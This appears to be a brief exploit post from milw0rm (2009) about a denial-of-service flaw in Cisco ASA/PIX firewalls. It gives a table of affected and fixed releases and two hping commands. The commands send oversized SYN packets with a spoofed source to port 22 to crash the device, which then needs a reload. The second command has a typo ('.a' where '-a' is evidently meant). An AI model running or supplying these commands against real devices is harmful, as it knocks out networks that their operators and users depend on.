The vulnerability affects the following Cisco ASA/PIX versions:

Release     Fixed in:
--------     ---------
6.3        Not affected
7.0        7.0(8.6)   
7.1        7.1(2.81)   
7.2        7.2(4.30)   
8.0        8.0(4.28)   
8.1        8.1(2.19)   
8.2        8.2(0.230)

-----------------------------
Triggering the vuln
------------------------------

/*Utilize  1550 blocks on an ASA to trigger a crash...*/
hping --fast -p 22 -w 1518 -S -d 1480 -a 10.22.1.1 10.22.1.2

/* Trigger the vuln a bit faster */
hping --fast -p 22 -w 1518 -S -d 26201 .a 10.22.1.1 10.22.1.2

Reloading the device is the only way to recover from the denial of service.

| Daniel Uriah Clemens
"Moments of sorrow are moments of sobriety" 

# milw0rm.com [2009-04-10]